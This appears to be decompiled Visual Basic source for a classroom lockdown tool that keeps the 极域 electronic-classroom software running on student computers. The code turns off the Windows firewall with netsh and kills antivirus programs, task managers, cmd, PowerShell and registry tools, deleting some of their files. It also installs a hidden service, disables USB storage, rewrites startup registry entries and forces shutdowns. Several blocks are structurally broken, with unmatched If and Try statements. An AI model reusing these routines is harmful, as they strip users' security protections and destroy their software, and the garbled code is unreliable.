Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Management
Imports System.Net
Imports System.Net.NetworkInformation
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.ServiceProcess
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.Win32
Imports WindowsApplication1.Internal

Namespace WindowsApplication1
	
	<DesignerGenerated()>
	Public Partial Class Form1
		Inherits Form

		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.NewState
			AddHandler MyBase.FormClosing, AddressOf Me.AssetState
			Me._CustomerStatus = 0L
			Me._ExpressionStatus = 0L
			Me._AccountStatus = New String(5) {}
			Me.classStatus = New String(100) {}
			Me.productStatus = New String(200) {}
			Me.refStatus = ""
			Me._PoolStatus = 0
			Me.m_IndexerStatus = 0
			Me.collectionStatus = 0
			Me.bridgeStatus = 0
			Me.methodStatus = 0L
			Me.m_InfoStatus = 0
			Me._InvocationStatus = 0
			Me._RuleStatus = 0
			Me.m_ComposerStatus = New ServiceController("tdfilefilter")
			Me.m_ReponseStatus = New ServiceController("tdnetfilter")
			Me.helperStatus = "C:\windows\jf"
			Me.m_ParserStatus = False
			Me._ContainerStatus = "C:\Windows\System32\drivers\etc\hosts"
			Me._QueueStatus = 0
			Me.m_ObserverStatus = New List(Of String)()
			Me._UtilsStatus = New List(Of String)()
			Me.m_WorkerStatus = String.Empty
			Me.m_MappingStatus = 0L
			Me._AdvisorStatus = 0L
			Me._ErrorStatus = ""
			Me.contextStatus = False
			Me.CalculateState()
		End Sub

		Private Declare Ansi Function GetDriveTypeA Lib "kernel32" (<MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpDeviceName As String) As Long

		Private Declare Ansi Function NtSuspendProcess Lib "ntdll.dll" (hProcess As IntPtr) As Integer

		Private Declare Ansi Function NtResumeProcess Lib "ntdll.dll" (hProcess As IntPtr) As Integer

		Private Declare Function RtlAdjustPrivilege (Privilege As Integer, Enable As Integer, CurrentThread As Integer, ByRef Enabled As Integer) As Integer

		Private Declare Function NtShutdownSystem (ShutdownOption As Integer) As Integer

		Private Declare Ansi Function SetForegroundWindow Lib "user32" (hWnd As IntPtr) As Boolean

		Private Declare Ansi Function GetForegroundWindow Lib "user32" () As IntPtr

		Private Declare Ansi Function GetWindowTextA Lib "user32" (hWnd As IntPtr, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpString As String, nMaxCount As Integer) As Integer

		Private Declare Ansi Function GetWindowThreadProcessId Lib "user32" (hWnd As IntPtr, ByRef lpdwProcessId As Integer) As Integer

		Private Declare Ansi Sub keybd_event (bVk As Byte, bScan As Byte, dwFlags As Integer, dwExtraInfo As Integer)

		Private Declare Function BlockInput (fBlockIt As Boolean) As Boolean

		Private Sub CompareState(sender As Object, e As EventArgs)
			Try
				ProjectData.ClearProjectError()
				Me._CustomerStatus += 1L
				Me.attrStatus = Conversions.ToString(FilterStatus.SearchState(Registry.CurrentUser, "Software\jfglzs", "zhuye", ""))
				Me.FindState("http://" + Me.attrStatus + "/hmd_net.txt", "on")
				File.SetAttributes(Me._ContainerStatus + "2", FileAttributes.Normal)
				File.Copy(Me._ContainerStatus, Me._ContainerStatus + "2", True)
				If Me.m_ParserStatus Then
					Me.Timer_route.Enabled = True
				Else
					Me.Timer_updatehosts.Enabled = True
				End If
				If Me._CustomerStatus = 10L Then
					Me.Timer_wangluo.Enabled = True
					Dim left2 As Object = Me.CheckProcessStatus(Me.m_ResolverStatus)
					If Operators.ConditionalCompareObjectEqual(left2, Form1.ProcessStatus.NotFound, False) Then
						If Not File.Exists(Me.m_ImporterStatus) Then
							Me.m_PredicateStatus = Me.m_ImporterStatus + "2"
							File.Copy(Me.m_PredicateStatus, Me.m_ImporterStatus)
						End If
						Process.Start(Me.m_ImporterStatus)
					End If
				ElseIf Me._CustomerStatus = 7L Then
					Me.Timer_fhq.Enabled = True
					Me.Timer1.Enabled = True
				ElseIf Me._CustomerStatus = 2L Then
					If Operators.CompareString(Me._MockStatus, "", False) <> 0 And Operators.CompareString(Me.fieldStatus, "", False) <> 0 And Operators.CompareString(Me.m_ConnectionStatus, "", False) <> 0 Then
						Me.Timer_qdx.Enabled = True
					End If
					Dim left As String = Conversions.ToString(FilterStatus.SearchState(Registry.CurrentUser, "Software\jfglzs", "usb_jianche", ""))
					If Operators.CompareString(left, "on", False) = 0 Then
						Me.Timer_usb.Enabled = True
					End If
				End If
			End If
			If Me._CustomerStatus = 12L Then
				left2 = Me.CheckProcessStatus(Me.m_ResolverStatus)
				If Operators.ConditionalCompareObjectNotEqual(left2, Form1.ProcessStatus.NotFound, False) Then
					Me.Timer_dzjs.Enabled = True
				End If
				Me.Timer_main.Enabled = False
			End If
		End Sub

		Private Sub ValidateState(sender As Object, e As EventArgs)
			If Not TokenStatus.DisableState.Form2.Visible Then
				TokenStatus.DisableState.Form2.Show()
			End If
		End Sub

		<MethodImpl(MethodImplOptions.NoOptimization)>
		Private Sub MapState(sender As Object, e As EventArgs)
			Try
				ProjectData.ClearProjectError()
				If Me.InterruptState("zmserv") Then
				Else
					If Not File.Exists(Application.StartupPath + "\zmserv.exe") Then
						If File.Exists(Me.helperStatus + "\zmserv.dat") Then
							File.Copy(Me.helperStatus + "\zmserv.dat", Application.StartupPath + "\zmserv.exe")
						End If
					End If
					FilterStatus.ReadState(Registry.CurrentUser, "Software\Policies\Microsoft\Windows\System", "DisableCMD", 0, 4)
					Dim str As String = Application.StartupPath + "\zmserv.exe"
					Interaction.Shell("sc create zmserv binPath= " + str + " start= auto", AppWinStyle.Hide, True, -1)
					Interaction.Shell("net start zmserv", AppWinStyle.Hide, True, -1)
				End If
				If Me.InterruptState(Conversions.ToString(FilterStatus.serializerStatus)) Then
				Else
					Me._AdvisorStatus += 1L
					If Not File.Exists(Application.StartupPath + "\przs.exe") Then
						If File.Exists(Me.helperStatus + "\przs.dat") Then
							File.Copy(Me.helperStatus + "\przs.dat", Application.StartupPath + "\przs.exe")
						End If
					End If
					Process.Start(Application.StartupPath + "\przs.exe")
					If Me._AdvisorStatus >= 5L Then
						FilterStatus.ReadState(Registry.CurrentUser, "Software\Policies\Microsoft\Windows\System", "DisableCMD", 0, 4)
						Interaction.Shell("net stop zmserv", AppWinStyle.Hide, True, -1)
						Thread.Sleep(3000)
						Dim str2 As String = Application.StartupPath + "\zmserv.exe"
						Interaction.Shell("sc create zmserv binPath= " + str2 + " start= auto", AppWinStyle.Hide, True, -1)
						Interaction.Shell("net start zmserv", AppWinStyle.Hide, True, -1)
						Process.Start(Application.StartupPath + "\jfglzsn.exe")
						ProjectData.EndApp()
					End If
				End If
				Return
			Catch
			End Try
		End Sub

		Private Sub SortState(sender As Object, e As EventArgs)
			Try
				ProjectData.ClearProjectError()
				Dim usbStartValue As Integer = Conversions.ToInteger(FilterStatus.SearchState(Registry.LocalMachine, "SYSTEM\CurrentControlSet\Services\usbstor", "Start", ""))
				If usbStartValue = 3 Then
					FilterStatus.ReadState(Registry.LocalMachine, "SYSTEM\CurrentControlSet\Services\usbstor", "Start", 4, 4)
					FilterStatus.ReadState(Registry.LocalMachine, "SYSTEM\ControlSet001\Services\usbstor", "Start", 4, 4)
					FilterStatus.ReadState(Registry.LocalMachine, "SYSTEM\ControlSet002\Services\usbstor", "Start", 4, 4)
					FilterStatus.ReadState(Registry.LocalMachine, "SYSTEM\ControlSet003\Services\usbstor", "Start", 4, 4)
					TokenStatus.DisableState.Form2.shuoming.Text = "你修改注册表企图使用U盘！请重新启动电脑。"
					TokenStatus.DisableState.Form2.Show()
					Me.Timer2.Enabled = True
				End If
			Catch
			End Try
		End Sub

		Private Sub ResolveState(sender As Object, e As EventArgs)
			Try
				ProjectData.ClearProjectError()
				Select Case Me.m_OrderStatus
					Case 0
						Me.Timer_dzjs.Enabled = False
					Case 1
						Dim upperBound As Integer = Information.UBound(Me._AccountStatus, 1)
						For i As Integer = 0 To upperBound
							Dim processName As String = Strings.Replace(Me._AccountStatus(i), ".exe", "", 1, -1, CompareMethod.Binary)
							If Not Me.InterruptState(processName) Then
								TokenStatus.DisableState.Form2.shuoming.Text = "电子教室进程未找到或本地连接IP地址错误！请重新启动电脑。"
								TokenStatus.DisableState.Form2.Show()
								Me.Timer2.Enabled = True
							End If
						Next
					Case 2
						Dim processStatus As Form1.ProcessStatus = Me.CheckProcessStatus(Me.m_ResolverStatus)
						Select Case processStatus
							Case Form1.ProcessStatus.Running
								Me.m_ValueStatus = 0
								If Me._PolicyStatus Then
									TokenStatus.DisableState.Form3.Close()
								End If
								Me._PolicyStatus = False
							Case Form1.ProcessStatus.Suspended
								Me.m_ValueStatus += 1
							Case Form1.ProcessStatus.NotResponding
								Me.m_ValueStatus += 1
							Case Form1.ProcessStatus.NotFound
								Me._PolicyStatus = True
								Me.bridgeStatus += 1
								If Not File.Exists(Me.m_ImporterStatus) Then
									Me.m_PredicateStatus = Me.m_ImporterStatus + "2"
									File.Copy(Me.m_PredicateStatus, Me.m_ImporterStatus)
								End If
								Process.Start(Me.m_ImporterStatus)
						End Select
				End Select
				If Me.bridgeStatus >= 5 Then
					Form1.ForceShutdown()
					Process.Start("shutdown", "/s /f /t 0")
				End If
				If Me.m_ValueStatus > 10 Then
					TokenStatus.DisableState.Form2.shuoming.Text = "电子教室程序被暂停！"
					TokenStatus.DisableState.Form2.Show()
					Me.Timer2.Enabled = True
				ElseIf Me.m_ValueStatus > 8 Then
					Me._PolicyStatus = True
					TokenStatus.DisableState.Form3.shuoming.Text = "电子教室程序被暂停！"
					TokenStatus.DisableState.Form3.Show()
				End If
				Return
			Catch
			End Try
		End Sub

		Private Sub ExcludeState(sender As Object, e As EventArgs)
			Try
				ProjectData.ClearProjectError()
				Dim wiredNetworkIP As String = Me.GetWiredNetworkIP()
				If String.IsNullOrEmpty(Me._InstanceStatus) AndAlso Not String.IsNullOrEmpty(wiredNetworkIP) AndAlso Not wiredNetworkIP.StartsWith("169.254.") Then
					Me._InstanceStatus = wiredNetworkIP
				End If
				If String.IsNullOrEmpty(wiredNetworkIP) Then
					Me.m_IndexerStatus += 1
					If Me.m_IndexerStatus > 5 Then
						TokenStatus.DisableState.Form3.shuoming.Text = "你拔了网线或禁用了网络连接！"
						TokenStatus.DisableState.Form3.shuoming2.Text = "请马上恢复网络，否则会全屏锁定！"
						TokenStatus.DisableState.Form3.Show()
					Else
						TokenStatus.DisableState.Form3.Close()
						TokenStatus.DisableState.Form2.shuoming.Text = "你拔了网线或禁用了网络连接！"
						TokenStatus.DisableState.Form2.shuoming2.Text = "请重新启动电脑！"
						TokenStatus.DisableState.Form2.Show()
						Me.Timer2.Enabled = True
					End If
				End If
			ElseIf Operators.CompareString(wiredNetworkIP, Me._InstanceStatus, False) <> 0 AndAlso Operators.CompareString(Me._InstanceStatus, "", False) <> 0 Then
				Me.m_IndexerStatus += 1
				If Me.m_IndexerStatus > 5 Then
					TokenStatus.DisableState.Form3.Close()
					TokenStatus.DisableState.Form2.shuoming.Text = "你修改了IP地址！原地址为:" + Me._InstanceStatus
					TokenStatus.DisableState.Form2.shuoming2.Text = "请重新启动电脑！"
					TokenStatus.DisableState.Form2.Show()
					Me.Timer2.Enabled = True
				Else
					Me._RequestStatus = True
					TokenStatus.DisableState.Form3.shuoming.Text = "你修改了IP地址！原地址为:" + Me._InstanceStatus
					TokenStatus.DisableState.Form3.shuoming2.Text = "请马上恢复网络，否则会全屏锁定！"
					TokenStatus.DisableState.Form3.Show()
				End If
			ElseIf Me._RequestStatus OrElse Me._AttributeStatus Then
				TokenStatus.DisableState.Form3.Close()
			End If
			Me._RequestStatus = False
			Me._AttributeStatus = False
			Return
		Catch
		End Try
	End Sub

		<MethodImpl(MethodImplOptions.NoOptimization)>
		Private Sub CheckState(sender As Object, e As EventArrivedEventArgs)
			Dim managementBaseObject As ManagementBaseObject = CType(e.NewEvent("TargetInstance"), ManagementBaseObject)
			Dim processId As Integer = Conversions.ToInteger(managementBaseObject("ProcessId"))
			Me.m_TokenizerStatus = managementBaseObject("Name").ToString()
			Dim processById As Process = Process.GetProcessById(processId)
			Dim fileName As String = processById.MainModule.FileName
			Dim processMatched As Boolean = False
			Dim moduleMatched As Boolean = False
			If Not String.IsNullOrEmpty(fileName) Then
				Dim versionInfo As FileVersionInfo = FileVersionInfo.GetVersionInfo(fileName)
				Dim productName As String = versionInfo.ProductName
				Dim fileDescription As String = versionInfo.FileDescription
				Dim fullInfo As String = productName + fileDescription
				Me._QueueStatus = If(Operators.CompareString(Me._GetterStatus, "off", False) = 0, 11, 1)
				While Operators.CompareString(Me.classStatus(Me._QueueStatus), "", False) <> 0
					Dim targetProcess As String = Me.classStatus(Me._QueueStatus)
					If Strings.InStr("|" + Strings.UCase(Me.m_TokenizerStatus), Strings.UCase(targetProcess), CompareMethod.Binary) <> 0 Then
						processMatched = True
						Me._ListenerStatus = If(Operators.CompareString(Me.m_MapStatus, "off", False) = 0, 3, 1)
						While Operators.CompareString(Me.productStatus(Me._ListenerStatus), "", False) <> 0
							Dim targetModule As String = Me.productStatus(Me._ListenerStatus)
							If Strings.InStr(fullInfo, targetModule, CompareMethod.Binary) <> 0 Then
								moduleMatched = True
								If processMatched Then
									Select Case Me._QueueStatus
										Case <= 10
											MyBase.BeginInvoke(AddressOf Me.ConcatState)
										Case <= 16
											processById.Kill()
											MyBase.BeginInvoke(AddressOf Me.VerifyState)
										Case <= 21
											If Me.messageStatus <> 1 Then
												processById.Kill()
												MyBase.BeginInvoke(AddressOf Me.VerifyState)
											End If
										Case Else
											processById.Kill()
											MyBase.BeginInvoke(AddressOf Me.VerifyState)
											processById.WaitForExit(1000)
											FileSystem.Kill(fileName)
									End Select
								End If
								If Not moduleMatched Then Return
								Select Case Me._ListenerStatus
									Case <= 3, 4
										Thread.Sleep(2000)
										processById.Kill()
										Return
									Case 5
										MyBase.BeginInvoke(AddressOf Me.VerifyState)
										Thread.Sleep(2000)
										processById.Kill()
										Return
									Case 6
										MyBase.BeginInvoke(AddressOf Me.VerifyState)
										Thread.Sleep(500)
										processById.Kill()
										Return
									Case > 50
										processById.Kill()
										MyBase.BeginInvoke(AddressOf Me.VerifyState)
										processById.WaitForExit(1000)
										FileSystem.Kill(fileName)
										Return
									Case Else
										processById.Kill()
										If Me._ListenerStatus <> 43 Then
											MyBase.BeginInvoke(AddressOf Me.VerifyState)
										End If
										Return
								End Select
							End If
							Me._ListenerStatus += 1
						End While
					End If
					Me._QueueStatus += 1
				End While
			End If
		End Sub

		Private Sub InstantiateState(sender As Object, e As EventArgs)
			Try
				ProjectData.ClearProjectError()
				Dim standardFirewall As Object = RuntimeHelpers.GetObjectValue(FilterStatus.SearchState(Registry.LocalMachine, "SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile", "EnableFirewall", ""))
				Dim publicFirewall As Object = RuntimeHelpers.GetObjectValue(FilterStatus.SearchState(Registry.LocalMachine, "SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile", "EnableFirewall", ""))
				If Conversions.ToBoolean(Operators.OrObject(Operators.CompareObjectEqual(standardFirewall, "1", False), Operators.CompareObjectEqual(publicFirewall, "1", False))) Then
					Me._PoolStatus += 1
					If Me._PoolStatus > 5 Then
						TokenStatus.DisableState.Form3.Close()
						TokenStatus.DisableState.Form2.shuoming.Text = "你启用了防火墙，危害电子教室的运行！"
						TokenStatus.DisableState.Form2.shuoming2.Text = "请重新启动电脑！"
						TokenStatus.DisableState.Form2.Show()
						Me.Timer2.Enabled = True
					Else
						FilterStatus.ReadState(Registry.CurrentUser, "Software\Policies\Microsoft\Windows\System", "DisableCMD", 0, 4)
						Interaction.Shell("netsh advfirewall set allprofiles state off", AppWinStyle.Hide, True, -1)
						FilterStatus.ReadState(Registry.LocalMachine, "SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile", "EnableFirewall", 0, 4)
						FilterStatus.ReadState(Registry.LocalMachine, "SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile", "EnableFirewall", 0, 4)
						Me.m_AuthenticationStatus = True
						TokenStatus.DisableState.Form3.shuoming.Text = "你启用了防火墙，危害电子教室的运行！"
						TokenStatus.DisableState.Form3.shuoming2.Text = "现在助手强制关闭防火墙！"
						TokenStatus.DisableState.Form3.Show()
					End If
				ElseIf Me.m_AuthenticationStatus Then
					TokenStatus.DisableState.Form3.Close()
					Me.m_AuthenticationStatus = False
				End If
				Return
			Catch
			End Try
		End Sub

		Private Sub DestroyState(sender As Object, e As EventArgs)
			Try
				ProjectData.ClearProjectError()
				Dim passwordValue As Object = RuntimeHelpers.GetObjectValue(FilterStatus.SearchState(Registry.CurrentUser, "Software", "n", ""))
				If Operators.ConditionalCompareObjectNotEqual(passwordValue, Me._MockStatus, False) Then
					Me._ProcessStatus += 1
					FilterStatus.ReadState(Registry.CurrentUser, "Software", "n", Me._MockStatus, 1)
					TokenStatus.DisableState.Form3.shuoming.Text = "你修改了助手的密码！"
					TokenStatus.DisableState.Form3.shuoming2.Text = "现在强制恢复密码！"
					TokenStatus.DisableState.Form3.Show()
					Me._ListStatus = True
					If Me._ProcessStatus > 25 Then
						TokenStatus.DisableState.Form3.Close()
						TokenStatus.DisableState.Form2.shuoming.Text = "你修改了助手的密码！"
						TokenStatus.DisableState.Form2.shuoming2.Text = "请重新启动电脑！"
						TokenStatus.DisableState.Form2.Show()
						Me.Timer2.Enabled = True
					End If
				ElseIf Me._ListStatus Then
					TokenStatus.DisableState.Form3.Close()
					Me._ListStatus = False
				End If
				Dim prozsRun As Object = RuntimeHelpers.GetObjectValue(FilterStatus.SearchState(Registry.LocalMachine, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN", "prozs", ""))
				If Operators.ConditionalCompareObjectEqual(prozsRun, "", False) Then
					prozsRun = RuntimeHelpers.GetObjectValue(FilterStatus.SearchState(Registry.LocalMachine, "SOFTWARE\WOW6432NODE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN", "prozs", ""))
				End If
				Dim jfglzsnRun As Object = RuntimeHelpers.GetObjectValue(FilterStatus.SearchState(Registry.LocalMachine, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN", "jfglzsn", ""))
				If Operators.ConditionalCompareObjectEqual(jfglzsnRun, "", False) Then
					jfglzsnRun = RuntimeHelpers.GetObjectValue(FilterStatus.SearchState(Registry.LocalMachine, "SOFTWARE\WOW6432NODE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN", "jfglzsn", ""))
				End If
				If Conversions.ToBoolean(Operators.OrObject(Operators.CompareObjectNotEqual(prozsRun, Me.fieldStatus, False), Operators.CompareObjectNotEqual(jfglzsnRun, Me.m_ConnectionStatus, False))) Then
					FilterStatus.ReadState(Registry.LocalMachine, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN", "prozs", Application.StartupPath + "\przs.exe", 1)
					FilterStatus.ReadState(Registry.LocalMachine, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN", "jfglzsn", Application.StartupPath + "\jfglzsn.exe", 1)
				End If
				Return
			Catch
			End Try
		End Sub

		Private Sub InsertState(sender As Object, e As EventArgs)
			Try
				ProjectData.ClearProjectError()
				Dim channelId As Integer
				Dim autoLogin As Integer
				Select Case Me._RuleStatus
					Case 1
						channelId = Conversions.ToInteger(FilterStatus.SearchState(Registry.LocalMachine, "SOFTWARE\Wow6432Node\TopDomain\e-Learning Class\Student", "ChannelId", ""))
						autoLogin = Conversions.ToInteger(FilterStatus.SearchState(Registry.LocalMachine, "SOFTWARE\Wow6432Node\TopDomain\e-Learning Class\Student", "AutoLogin", ""))
					Case 2
						channelId = Conversions.ToInteger(FilterStatus.SearchState(Registry.LocalMachine, "SOFTWARE\TopDomain\e-Learning Class\Student", "ChannelId", ""))
						autoLogin = Conversions.ToInteger(FilterStatus.SearchState(Registry.LocalMachine, "SOFTWARE\TopDomain\e-Learning Class\Student", "AutoLogin", ""))
				End Select
				If channelId <> Me.m_InfoStatus Or autoLogin <> Me._InvocationStatus Then
					Me.m_TaskStatus += 1
					TokenStatus.DisableState.Form3.shuoming.Text = "你修改了极域电子教室的参数！"
					TokenStatus.DisableState.Form3.shuoming2.Text = "请马上恢复，否则会锁屏！"
					TokenStatus.DisableState.Form3.Show()
					Me.m_SingletonStatus = True
				ElseIf Me.m_SingletonStatus Then
					TokenStatus.DisableState.Form3.Close()
					Me.m_SingletonStatus = False
				End If
				If Me.m_TaskStatus > 5 Then
					TokenStatus.DisableState.Form3.Close()
					TokenStatus.DisableState.Form2.shuoming.Text = "你修改了极域电子教室的参数！"
					TokenStatus.DisableState.Form2.Show()
					Me.Timer2.Enabled = True
				End If
				If Me.m_RoleStatus Then
					Me.m_ComposerStatus.Refresh()
					Me.m_ReponseStatus.Refresh()
					If Me.m_ComposerStatus.Status = CType(0, ServiceControllerStatus) Or Me.m_ReponseStatus.Status = CType(0, ServiceControllerStatus) Then
						Me._ExceptionStatus += 1
						TokenStatus.DisableState.Form3.shuoming.Text = "极域电子教室的2个重要服务不存在！"
						TokenStatus.DisableState.Form3.Show()
						Me.m_ComparatorStatus = True
					End If
				End If
				If Me.m_ComposerStatus.Status = ServiceControllerStatus.Running And Me.m_ReponseStatus.Status = ServiceControllerStatus.Running Then
					If Me.m_ComparatorStatus Then
						TokenStatus.DisableState.Form3.Close()
					End If
					Me.m_ComparatorStatus = False
				Else
					Me.m_ComposerStatus.Start()
					Me.m_ReponseStatus.Start()
					Me._ExceptionStatus += 1
					TokenStatus.DisableState.Form3.shuoming.Text = "极域电子教室的2个重要服务停止！"
					TokenStatus.DisableState.Form3.Show()
					Me.m_ComparatorStatus = True
				End If
				If Me._ExceptionStatus > 5 Then
					TokenStatus.DisableState.Form3.Close()
					TokenStatus.DisableState.Form2.shuoming.Text = "极域电子教室的2个重要服务停止！"
					TokenStatus.DisableState.Form2.Show()
					Me.Timer2.Enabled = True
				End If
				Return
			Catch
			End Try
		End Sub

		Private Sub OrderState(sender As Object, e As EventArgs)
			Me.FindState("http://" + Me.attrStatus + "/hmd_net.txt", "on")
			If Me.m_ParserStatus Then
				File.SetAttributes(Me._ContainerStatus + "2", FileAttributes.Normal)
				File.Copy(Me._ContainerStatus, Me._ContainerStatus + "2", True)
				Me.Timer_route.Enabled = True
				Me.Timer_updatehosts.Enabled = False
			End If
			Me._ExpressionStatus += 1L
			If Me._ExpressionStatus > 3L Then
				Me.Timer_updatehosts.Interval = 60000
			End If
		End Sub

		Private Sub DefineState(sender As Object, e As EventArgs)
			If Operators.CompareString(Conversions.ToString(FilterStatus.SearchState(Registry.LocalMachine, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\route.exe", "Debugger", "")), "null", False) = 0 Then
				If Me._ServerStatus Then
					TokenStatus.DisableState.Form3.Close()
				End If
				Me._ServerStatus = False
				Return
			End If
			Me.m_ValStatus += 1
			If Me.m_ValStatus <= 5 Then
				Me.FindState("http://" + Me.attrStatus + "/hmd_net.txt", "on")
				Me._ServerStatus = True
				TokenStatus.DisableState.Form3.shuoming.Text = "你修改了小助手r设置！"
				TokenStatus.DisableState.Form3.shuoming2.Text = "现在助手强制恢复！"
				TokenStatus.DisableState.Form3.Show()
				Return
			End If
			TokenStatus.DisableState.Form3.Close()
			TokenStatus.DisableState.Form2.shuoming.Text = "你修改了小助手r设置！"
			TokenStatus.DisableState.Form2.shuoming2.Text = "请重新启动电脑！"
			TokenStatus.DisableState.Form2.Show()
			Me.Timer2.Enabled = True
		End Sub

		Private Sub NewState(sender As Object, e As EventArgs)
			Try
				ProjectData.ClearProjectError()
				MyBase.Hide()
				Dim todayValue As Integer = DateAndTime.Month(DateAndTime.Now) * DateAndTime.Day(DateAndTime.Now)
				Dim mod7 As Integer = todayValue Mod 7
				Dim mod9 As Integer = todayValue Mod 9
				Dim mod5 As Integer = todayValue Mod 5
				Dim mod3 As Integer = todayValue Mod 3
				Dim generatedName As String
				If todayValue Mod 2 = 0 Then
					generatedName = Conversions.ToString(Strings.Chr(97 + mod7)) + Conversions.ToString(Strings.Chr(98 + mod9)) + Conversions.ToString(Strings.Chr(101 + mod5)) + Conversions.ToString(Strings.Chr(99 + mod3))
				Else
					generatedName = Conversions.ToString(Strings.Chr(97 + mod9)) + Conversions.ToString(Strings.Chr(98 + mod7)) + Conversions.ToString(Strings.Chr(101 + mod3)) + Conversions.ToString(Strings.Chr(99 + mod5))
				End If
				FilterStatus.serializerStatus = generatedName
				FilterStatus._SetterStatus = generatedName + ".exe"
				VBMath.Randomize(CDbl(todayValue))
				Dim randomNum As Long = CLng(Math.Round(CDbl(VBMath.Rnd()) * 100000.0 * 3.0 + 1.0))
				Dim reverseNumStr As String = ""
				For i As Integer = 1 To 5
					Dim digit As Long = randomNum Mod 10L + 105L
					reverseNumStr = Conversions.ToString(Strings.Chr(CInt(digit))) + reverseNumStr
					randomNum /= 10L
				Next
				FilterStatus.serializerStatus = reverseNumStr
				FilterStatus._SetterStatus = reverseNumStr + ".exe"
				Me.m_MapperStatus = "C:\Program Files (x86)\" + Strings.Mid(reverseNumStr, 2, 4)
				Me._RepositoryStatus = Conversions.ToString(FilterStatus.SearchState(Registry.CurrentUser, "Software\jfglzs", "dzjs", ""))
				Me._PropertyStatus = Conversions.ToString(FilterStatus.SearchState(Registry.CurrentUser, "Software\jfglzs", "usb_jianche", ""))
				Me._GetterStatus = Conversions.ToString(FilterStatus.SearchState(Registry.CurrentUser, "Software\jfglzs", "shadu_jianche", ""))
				Me.m_MapStatus = Conversions.ToString(FilterStatus.SearchState(Registry.CurrentUser, "Software\jfglzs", "cmd_jianche", ""))
				Me._AccountStatus = Strings.Split(Me._RepositoryStatus, ",", -1, CompareMethod.Binary)
				If Operators.CompareString(Me._AccountStatus(0), "other", False) = 0 Or Operators.CompareString(Me._AccountStatus(0), "", False) = 0 Then
					Me.m_OrderStatus = 0
				ElseIf Strings.InStr(Me._AccountStatus(0), "\", CompareMethod.Binary) = 0 Then
					Me.m_OrderStatus = 1
				Else
					Me.m_OrderStatus = 2
				End If
				Me.m_ImporterStatus = Me._AccountStatus(0)
				Me.m_ResolverStatus = Strings.Replace(Path.GetFileName(Me.m_ImporterStatus), ".exe", "", 1, -1, CompareMethod.Binary)
				Me.classStatus(1) = "|备用"
				Me.classStatus(2) = "|备用"
				Me.classStatus(3) = "|备用"
				Me.classStatus(4) = "|360safe.exe"
				Me.classStatus(5) = "|HipsTray.exe"
				Me.classStatus(6) = "|QQPCTray.exe"
				Me.classStatus(7) = "|360taskmgr"
				Me.classStatus(8) = "|QQPCNetFlow.exe"
				Me.classStatus(9) = "|360netman.exe"
				Me.classStatus(10) = "|iu杀毒"
				Me.classStatus(11) = "进程"
				Me.classStatus(12) = "任务管理"
				Me.classStatus(13) = "虚拟桌面"
				Me.classStatus(14) = "|Minesweeper"
				Me.classStatus(15) = "|winmine.exe"
				Me.classStatus(16) = "|solitaire.exe"
				Me.classStatus(17) = "|winrarrr.exe"
				Me.classStatus(18) = "|wzmainnn.exe"
				Me.classStatus(19) = "|bandizippp.exe"
				Me.classStatus(20) = "|7zFMMM.exe"
				Me.classStatus(21) = "|360zippp.exe"
				Me.classStatus(22) = "掌控课堂"
				Me.classStatus(23) = "夕颜若雪工具箱"
				Me.classStatus(24) = "极域"
				Me.classStatus(25) = "课堂狂欢器"
				Me.classStatus(26) = "电子教室"
				Me.classStatus(27) = "吾爱破解"
				Me.classStatus(28) = "|NoTopDomain"
				Me.productStatus(1) = "Windows 命令处理程序"
				Me.productStatus(2) = "Windows Command Processor"
				Me.productStatus(3) = "Windows PowerShell"
				Me.productStatus(4) = "注册表编辑器"
				Me.productStatus(5) = "Microsoft 管理控制台"
				Me.productStatus(6) = "任务管理器"
				Me.productStatus(7) = "PC Hunter"
				Me.productStatus(8) = "IceSword"
				Me.productStatus(9) = "Wsyscheck"
				Me.productStatus(10) = "SnipeSword"
				Me.productStatus(11) = "Process Explorer"
				Me.productStatus(12) = "狡兔二窟"
				Me.productStatus(13) = "Process-X"
				Me.productStatus(14) = "Process Master"
				Me.productStatus(15) = "PrcView"
				Me.productStatus(16) = "Process Viewer"
				Me.productStatus(17) = "PowerTool"
				Me.productStatus(18) = "Windows Kernel Explorer"
				Me.productStatus(19) = "FTCleaner"
				Me.productStatus(20) = "Process Lasso"
				Me.productStatus(21) = "process manager"
				Me.productStatus(22) = "Process Hacker"
				Me.productStatus(23) = "ProcessOVER"
				Me.productStatus(24) = "Dexpot"
				Me.productStatus(25) = "Deskman"
				Me.productStatus(26) = "iDesktop"
				Me.productStatus(27) = "YtMDesk"
				Me.productStatus(28) = "DexpotProPortable"
				Me.productStatus(29) = "Desktops"
				Me.productStatus(30) = "Wise Desktop"
				Me.productStatus(31) = "VDesktop"
				Me.productStatus(32) = "MagicDesktop"
				Me.productStatus(33) = "MultiDesk"
				Me.productStatus(34) = "小宝虚拟桌面"
				Me.productStatus(35) = "系统配置实用程序"
				Me.productStatus(36) = "资源和性能监视器"
				Me.productStatus(37) = "Special Setting Program"
				Me.productStatus(38) = "瑞星防火墙"
				Me.productStatus(39) = "火绒剑"
				Me.productStatus(40) = "超级进程王"
				Me.productStatus(41) = "OpenArk"
				Me.productStatus(42) = "Procmon"
				Me.productStatus(43) = "GameBar"
				Me.productStatus(44) = "Registry Workshop"
				Me.productStatus(45) = "暂 时 备 用"
				Me.productStatus(46) = "暂 时 备 用"
				Me.productStatus(47) = "暂 时 备 用"
